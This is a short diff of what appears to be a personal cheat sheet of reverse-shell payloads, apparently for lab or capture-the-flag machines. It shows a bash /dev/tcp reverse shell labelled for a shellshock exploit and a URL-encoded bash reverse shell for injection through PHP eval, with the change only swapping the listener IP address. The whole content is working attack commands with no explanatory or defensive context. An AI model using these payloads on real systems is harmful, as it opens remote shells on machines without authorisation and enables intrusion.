@@ -26,4 +26,4 @@ in shellshock:
 /bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
 
 through php eval:
-bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.11/9001+0>%261'
+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/9001+0>%261'
